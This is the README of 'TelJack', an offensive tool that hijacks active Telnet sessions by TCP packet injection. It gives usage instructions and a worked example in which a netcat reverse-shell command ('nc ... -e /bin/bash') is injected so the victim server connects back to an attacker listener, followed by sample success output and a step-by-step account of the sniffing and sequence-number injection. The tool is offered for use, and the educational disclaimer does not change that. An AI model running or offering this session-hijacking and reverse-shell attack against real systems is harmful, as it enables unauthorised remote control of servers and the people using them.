# TelJack
## Telnet Session Hijacking & Command Injection Tool
TelJack intercepts an active Telnet session between a client and a server, and once intercepted, injects a specified command into the session, making the server execute it as if it came from the legitimate client.

## Features
* Detects active Telnet sessions.
* Injects specified commands into the session.
* Acknowledges the server's echo of the injected command.
* Uses Scapy for packet sniffing and crafting.

## Prerequisites
* Python 3.x
* Scapy

## Installation
1. Ensure you have Python 3 installed.
2. Install Scapy:

```bash
pip install scapy
```

## Usage
```bash
sudo python3 teljack.py -t [TARGET_IP] -p [TARGET_PORT] -c "[COMMAND_TO_INJECT]"
```
* `TARGET_IP`: IP address of the target Telnet server.
* `TARGET_PORT`: Port number for the target Telnet server. Defaults to 23.
* `COMMAND_TO_INJECT`: The command you wish to inject into the Telnet session.

**Example:**
1. Start a netcat server to catch a reverse shell.
```bash
nc -nlvp 443
```
2. Start listening to the target Telnet server using the default port with a reverse shell command.
```bash
sudo python3 teljack.py -t 192.168.1.5 -c "nc 192.168.1.2 443 -e /bin/bash"
```
3. The script will listen for a Telnet connection, identify the client and wait for the perfect opportunity to inject the command. 

If successful the output will look like:
```bash
sudo python3 teljack.py -t 192.168.1.5 -c "nc 192.168.1.2 443 -e /bin/bash"
Starting packet sniffing...
Detected victim host: 192.168.1.4
Detected victim port: 58608
Preparing to send command: b'nc 192.168.1.2 443 -e /bin/bash'
Sending command with SEQ: 3918542522 and ACK: 1174627735
***
Command sent successfully!
***
Server ECHO with SEQ: 1174627774 and ACK: 3918542555: n
Acknowledgement of echo sent to server with SEQ: 3918542555 and ACK: 1174627777
SUCCESS!
```

## How It Works
1. **Initialization**: The script starts by setting up necessary parameters, such as the target server's IP address, the Telnet port, and the command you wish to inject.
2. **Packet Sniffing**: The script begins listening to network traffic, specifically looking for TCP packets related to the specified Telnet server.
3. **Victim Detection**: As it sniffs the packets, the script identifies the victim's IP address and port by observing the traffic directed towards the target server.
4. **Command Injection**: Once the victim is detected, the script waits for the right moment (typically after the victim sends a command) to inject the specified command into the session.
5. **Echo Detection**: After sending the command, the server might echo back part or all of the injected command. The script detects this echo.
6. **Acknowledgment**: Upon detecting the server's echo, the script sends a TCP acknowledgment.

## Disclaimer
This tool is intended for educational and demonstration purposes only. Unauthorized access to computer systems is illegal and unethical. Always obtain explicit permission before using this tool on any system. The author holds no responsibility for improper or illegal usage.